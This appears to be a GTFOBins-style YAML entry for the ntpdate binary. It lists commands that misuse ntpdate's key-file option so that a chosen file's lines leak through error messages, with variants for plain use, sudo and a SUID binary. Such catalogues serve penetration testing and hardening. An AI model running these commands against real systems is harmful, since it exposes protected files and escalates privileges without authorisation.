---
description: The file is actually parsed and lines are leaked through error messages.
functions:
  file-read:
    - code: |
        LFILE=file_to_read
        ntpdate -a x -k $LFILE -d localhost
  sudo:
    - code: |
        LFILE=file_to_read
        sudo ntpdate -a x -k $LFILE -d localhost
  suid:
    - code: |
        LFILE=file_to_read
        ./ntpdate -a x -k $LFILE -d localhost
---
